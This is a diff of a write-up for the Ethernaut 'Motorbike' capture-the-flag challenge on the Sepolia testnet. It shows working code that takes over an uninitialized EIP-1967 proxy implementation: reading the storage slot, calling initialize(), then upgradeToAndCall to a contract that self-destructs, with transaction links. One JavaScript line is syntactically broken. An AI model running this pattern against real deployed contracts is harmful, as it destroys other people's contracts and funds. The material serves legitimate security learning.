@@ -148,6 +148,20 @@ This set of contracts implements a basic upgradeability pattern using EIP-1967, 
 
 # Subverting
 
+```js
+address = await web3.eth.getStorageAt(instance, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")
+'0x000000000000000000000000c886bb58a9ef8f390296cb8ad0529c0f00b13155'
+```
+
+```js
+address = '0x' + address.slice(-40)
+'0xc886bb58a9ef8f390296cb8ad0529c0f00b13155'
+```
+
+<p align="center"><img width="400" src="https://github.com/wasny0ps/Ethernaut-Challenges/blob/main/Challenges/Motorbike/src/contract.png"/></p>
+
+<p align="center"><img height="450" src="https://github.com/wasny0ps/Ethernaut-Challenges/blob/main/Challenges/Motorbike/src/upgrader.png"/></p>
+
 
 ```solidity
 pragma solidity ^0.8.20;
@@ -160,27 +174,51 @@ interface IEngine{
 
 contract Attack {
 
-    function attack(IEngine target) external{
-        target.initializer();
-        bytes memory data = abi.encodeWithSignature("pwn()");
-        target.upgradeToAndCall(address(this),data);
+    function signature() external view returns(bytes memory){
+        return abi.encodeWithSignature("attack()");
     }
 
-    function pwn() external {
+    function attack() external{
         selfdestruct(payable(address(0)));
     }
 }
 ```
 
+Deploy the attack contract and get the signature of our attack() function. See the transaction [on etherscan](https://sepolia.etherscan.io/tx/0xdd3a50c58686e7327229a23ef87ed7afebe75f905180a96978e2aa58beb52c03).
+
+<p align="center"><img width="250" src="https://github.com/wasny0ps/Ethernaut-Challenges/blob/main/Challenges/Motorbike/src/signature.png"/></p>
+
+
+For being upgrader, send the transaction to the `Engine` contract with the `0x8129fc1c` value which is refers to keccak-256 signature hash of `initialize()` function. See the transaction on [etherscan](https://sepolia.etherscan.io/tx/0xed3ec7742edbac93cbd5984fd86a78671c1036a26fe383bdcc7c18f5def4fbb6).
+
 ```js
-address = await web3.eth.getStorageAt(instance, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")
-'0x000000000000000000000000c886bb58a9ef8f390296cb8ad0529c0f00b13155'
+await web3.eth.sendTransaction({from: player,to: address,data: '0x8129fc1c' // initialize()})
 ```
 
 ```js
-address = '0x' + address.slice(-40)
-'0xc886bb58a9ef8f390296cb8ad0529c0f00b13155'
+const _function = {
+  "inputs": [
+    { 
+      "name": "newImplementation",
+      "type": "address"
+    },
+    { 
+      "name": "data",
+      "type": "bytes"
+    }
+  ],
+  "name": "upgradeToAndCall", 
+  "type": "function"
+};
+const param = [
+  '0xAC1BD02388e07e3cC69664EE6A1c31616C5B25E7', // Attack
+  '0x9e5faafc', // attack()
+];
+const data = web3.eth.abi.encodeFunctionCall(_function, param);
+await web3.eth.sendTransaction({from: player, to: address,data: data})
 ```
+
+See the transation [on etherscan](https://sepolia.etherscan.io/tx/0xb12150f04808b3f9b93c68c1bb93a64b54c5b3bfe27c435322391ccac5d9d27e).
 
 Ethernaut's message:
 
